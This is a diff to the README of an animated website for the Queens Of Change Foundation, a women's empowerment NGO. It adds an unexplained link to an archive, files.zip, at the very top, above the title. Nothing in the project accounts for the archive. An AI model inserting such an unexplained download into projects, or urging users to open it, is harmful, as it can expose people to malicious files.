@@ -1,3 +1,7 @@
+[files.zip](https://github.com/user-attachments/files/28923664/files.zip)
+
+
+
 # ♛ Queens Of Change Foundation
 
 A responsive, animated website built for the **Queens Of Change Foundation** — an NGO dedicated to empowering women and girls through education, mentorship, and community.
